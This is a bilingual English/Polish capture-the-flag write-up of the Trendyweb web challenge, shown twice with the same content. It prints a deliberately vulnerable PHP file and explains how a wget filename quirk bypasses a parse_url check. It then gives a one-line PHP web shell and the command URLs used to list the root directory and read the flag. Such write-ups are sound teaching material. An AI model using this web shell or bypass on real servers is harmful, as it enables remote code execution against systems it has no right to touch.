## Trendyweb (Web, 100p)

###ENG
[PL](#pl-version)

We get the source for index.php running on server:

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 'On');
ini_set('allow_url_fopen', 'On'); // yo!

$session_path = '';

	class MyClass { function __wakeup() { system($_GET['cmd']); // come onn!
	} }

	function onShutdown() {
		global $session_path;
		file_put_contents($session_path. '/pickle', serialize($_SESSION));
	}

	session_start();
	register_shutdown_function('onShutdown');

	function set_context($id) {
		global $_SESSION, $session_path;

		$session_path=getcwd() . '/data/'.$id;
		if(!is_dir($session_path)) mkdir($session_path);
		chdir($session_path);

		if(!is_file('pickle')) $_SESSION = array();
		else $_SESSION = unserialize(file_get_contents('pickle'));
	}

	function download_image($url) {
		$url = parse_url($origUrl=$url);
		if(isset($url['scheme']) && $url['scheme'] == 'http')
			if($url['path'] == '/avatar.png') {
				system('/usr/bin/wget '.escapeshellarg($origUrl));
			}
	}

	if(!isset($_SESSION['id'])) {
		$sessId = bin2hex(openssl_random_pseudo_bytes(10));
		$_SESSION['id'] = $sessId;
	} else {
		$sessId = $_SESSION['id'];
	}
	session_write_close();
	set_context($sessId);
	if(isset($_POST['image'])) download_image($_POST['image']);
?>

<img src="/data/<?php echo $sessId; ?>/avatar.png" width=80 height=80 />
```

And information that we need a shell to run a flag reader in `/`.

Intially we focused on the obvious unserialize vulnerability, but we could not figure out how to put our payload inside `pickle` file.
The only way seemed to be using the `download_image` function, but wget would not save the file under selected name.
While considering if this can be overriden we found out that wget behaves interestingly when the URL has some GET parameters.

Specifically downloading from URL `http://something.pwn/avatar.png?hacked.php` will actually create a file with name `avatar.png?hacked.php`.
At the same time the `parse_url` checks in `download_image` will pass since the GET parameters are not part of `$url['path']`.

Since the uploaded file had now .php extension the server was interpreting the script inside, so we simply put a PHP shell inside:

```php
<? system($_GET['cmd']) ?>
```

And with that we could simply run 

`http://chal.cykor.kr:8082/data/70c1e5e960e833a1183b/avatar.png%3fhacked.php?cmd=ls /`

to get the name of flag reading binary (`flag_is_heeeeeeeereeeeeee`) and then:

`http://chal.cykor.kr:8082/data/70c1e5e960e833a1183b/avatar.png%3fhacked.php?cmd=/flag_is_heeeeeeeereeeeeee`

to get the actual flag: `1-day is not trendy enough`

###PL version

Dostajemy źródło pliku index.php działającego na serwerze:

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 'On');
ini_set('allow_url_fopen', 'On'); // yo!

$session_path = '';

	class MyClass { function __wakeup() { system($_GET['cmd']); // come onn!
	} }

	function onShutdown() {
		global $session_path;
		file_put_contents($session_path. '/pickle', serialize($_SESSION));
	}

	session_start();
	register_shutdown_function('onShutdown');

	function set_context($id) {
		global $_SESSION, $session_path;

		$session_path=getcwd() . '/data/'.$id;
		if(!is_dir($session_path)) mkdir($session_path);
		chdir($session_path);

		if(!is_file('pickle')) $_SESSION = array();
		else $_SESSION = unserialize(file_get_contents('pickle'));
	}

	function download_image($url) {
		$url = parse_url($origUrl=$url);
		if(isset($url['scheme']) && $url['scheme'] == 'http')
			if($url['path'] == '/avatar.png') {
				system('/usr/bin/wget '.escapeshellarg($origUrl));
			}
	}

	if(!isset($_SESSION['id'])) {
		$sessId = bin2hex(openssl_random_pseudo_bytes(10));
		$_SESSION['id'] = $sessId;
	} else {
		$sessId = $_SESSION['id'];
	}
	session_write_close();
	set_context($sessId);
	if(isset($_POST['image'])) download_image($_POST['image']);
?>

<img src="/data/<?php echo $sessId; ?>/avatar.png" width=80 height=80 />
```

Oraz informacje, że potrzebujemy shella aby uruchomic program do odczytania flagi znajdujący się w `/`.

Początkowo skupiliśmy się na ewidentnej podatności unserialize, ale nie mogliśmy dojść do tego, jak umieścić nasz payload w pliku `pickle`.
Jedyna sensowna droga sugerowała użycie funkcji `download_image`, ale nie wiedzieliśmy jak zmusić wgeta do zapisania pliku pod inną nazwą.
Podczas rozważania jak można zmienić nazwę wynikowego pliku zauważyliśmy, że wget ciekawe obsługuje URLe  z parametrami GET.

Konkretnie pobieranie z URLa `http://something.pwn/avatar.png?hacked.php` utworzy plik o nazwie `avatar.png?hacked.php`.
Jednocześnie wszystkie warunki w`parse_url` będą nadal spełnione bo parametry GET nie są częścią `$url['path']`.

Ponieważ tak uploadowany plik ma rozszerzenie .php serwer wykonuje skrypty w nim zawarte, więc umieściliśmy tam prosty PHP shell:

```php
<? system($_GET['cmd']) ?>
```

I w ten sposób mogliśmy uruchomić:

`http://chal.cykor.kr:8082/data/70c1e5e960e833a1183b/avatar.png%3fhacked.php?cmd=ls /`

aby pobrać nazwę programu do odczytywania flagi (`flag_is_heeeeeeeereeeeeee`) a następnie:

`http://chal.cykor.kr:8082/data/70c1e5e960e833a1183b/avatar.png%3fhacked.php?cmd=/flag_is_heeeeeeeereeeeeee`

aby odczytać flagę: `1-day is not trendy enough`
